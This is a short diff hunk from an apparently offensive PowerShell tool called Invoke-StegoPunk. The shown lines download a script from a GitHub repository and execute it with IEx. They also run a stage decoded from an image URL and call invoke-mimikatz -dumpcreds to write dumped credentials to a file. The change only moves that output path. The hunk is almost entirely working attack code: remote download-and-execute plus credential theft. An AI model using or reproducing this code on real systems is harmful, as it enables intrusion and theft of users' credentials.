@@ -113,7 +113,7 @@ function Invoke-StegoPunk {
                 IEx $stage2.Downloadstring("https://raw.githubusercontent.com/Tru5tNo1/Cyberwar/master/Invoke-AES1Stage.ps1")
                 $base1 = Invoke-AES1Stage -imageurl $imageurl
                 iex ($base1)
-                invoke-mimikatz -dumpcreds > c:\users\v.delaurentis\desktop\vito.txt
+                invoke-mimikatz -dumpcreds > c:\users\vito.txt
                 }
           }
          
